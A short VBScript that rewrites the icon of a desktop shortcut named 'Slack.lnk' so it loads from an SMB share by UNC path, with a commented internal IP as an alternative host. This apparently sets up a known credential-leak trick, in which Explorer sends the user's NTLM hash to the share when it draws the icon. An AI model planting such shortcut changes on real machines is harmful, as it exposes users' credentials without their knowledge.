Sub shortcutIcon(targetLnk, lnkIcon)
    
    Set Shell = WScript.CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    sFolder = Shell.SpecialFolders("Desktop")
    Set folder = fso.GetFolder(sFolder)
    Set files = folder.Files
    targetLnk = fso.GetAbsolutePathName(folder) & "\" & targetLnk
    WScript.Echo targetLnk
    For each folderIdx In files
        fullname = fso.GetAbsolutePathName(folderIdx)
        
        If targetLnk = fullname Then

            Set lnk = Shell.CreateShortcut(fullname) 
            WScript.Echo lnk.IconLocation
            ' lnk.HotKey = "ALT+CTRL+F"
            lnk.IconLocation = lnkIcon
            lnk.Save
            WScript.Echo lnk.IconLocation
            WScript.Echo fullname
        End If
    ' Set lnk = Nothing
    Next

End Sub

Sub shortcutIcon2(targetLnk, lnkIcon)

    Const DESKTOP = &H10&

    Set objShell = CreateObject("Shell.Application")
    Set objFolder = objShell.NameSpace(DESKTOP)
    Set objFolderItem = objFolder.ParseName(targetLnk)
    Set lnk = objFolderItem.GetLink
    lnk.SetIconLocation lnkIcon, 0
    lnk.Save
    WScript.Echo lnk.GetIconLocation()

End Sub

shortcutIcon "Slack.lnk", "\\localhost\sambashare\slack.ico"
'"\\172.16.104.51\share\slack.ico"